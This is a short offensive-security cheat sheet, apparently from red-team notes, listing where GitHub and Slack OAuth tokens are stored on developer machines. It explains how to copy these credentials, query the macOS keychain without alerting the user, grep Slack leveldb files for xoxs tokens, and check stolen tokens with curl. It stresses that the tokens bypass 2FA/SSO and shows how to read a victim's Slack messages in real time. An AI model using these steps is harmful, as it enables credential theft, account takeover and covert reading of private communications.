# Credential Files
A collection of file paths where you might happen onto credentials, auth tokens, certificates, and keypairs useful for lateral movement.

## Dev & DevOps

### Github OAUTH Token
*Default path(s)*: `$HOME/.config/hub`, `$XDG_CONFIG_HOME/hub`  

*Description*: Contains Github OAUTH credentials and created by the `hub` tool. Bypasses 2FA/SSO if enabled.

*Using it*: The contents of the file can be copied to your personal machine and used as is with `git` or `hub` commands.

If you want to test the validity of the token run `curl -s -i -H 'Authorization: token <OAUTH_TOKEN>' https://api.github.com/`. A `200 OK` status indicates a valid token while a `401 Unauthorized`  means the token has gone stale and is unusable until the next successful authorization with the `hub` command 

Sample file

```
github.com:
- user: n0ncetonic
  oauth_token: 3a222191f33b2b3f83f8cd2f93c493e2cbdfecec
  protocol: https
```

#### Alternative
Alternatively if the system is macOS (I'll add notes on linux at a later date) and utilizing the `git credential-osxkeychain` credential manager scheme it is possible to query the user's keychain for the corresponding user's git credentials without alterting the user with an authorization request.

```
$ git credential-osxkeychain get
host=github.com
proto=https
```

> NOTE: When you press return on the initial git command your terminal will appear to hang. At this point type in the hostname to the git server you are interested in, press return again, enter proto=https (I have yet to try this with ssh key authentication, YMMV) and pretty return twice. After which the command will spit out your credentials.

## Email & Communication

### Slack OAUTH Tokens

* Default path(s)*:`$HOME/Library/Application\ Support/Slack/Local\ Storage/leveldb/*.log`, `$HOME/Library/Application\ Support/Slack/Local\ Storage/leveldb/*.ldb`, `$HOME/Library/Application\ Support/Slack/Local\ Storage/leveldb/MANIFEST-*`

*Description*: Contains Slack OAUTH "Legacy" token. Slack claims these are no longer in use but that appears not to be the case with their official desktop client (at least for macOS). Bypasses 2FA/SSO if enabled on the account.

> These tokens were associated with legacy custom integrations and early Slack integrations requiring an ambiguous "API token." They were generated using the legacy token generator and are no longer recommended for use. They take on the full operational scope of the user that created them. If you're building a tool for your own team, we encourage creating an internal integration with only the scopes it needs to work.
_From Slack developer documentation_

*Using it*: You'll need to run `strings` or similar on the files and look for strings that match the regex `/xoxs-\d+-\d+-\d+-[\da-f]+/` . If you're looking for a tool that will harvest the tokens as well as test if they are still valid take a look at [toke_em](https://github.com/n0ncetonic/toke_em)

 
Testing token validity: `curl -s https://slack.com/api/auth.test?token=xoxs-YOUR-TOKEN-GOES-HERE&pretty=1`


Full RTM Snapshot: `curl -s https://slack.com/api/rtm.start?token=xoxs-YOUR-TOKEN-GOES-HERE&pretty=1`

Otherwise just grab your favorite Slack RTM API module/library and connect using the Legacy token and watch as messages and events fire in real time.
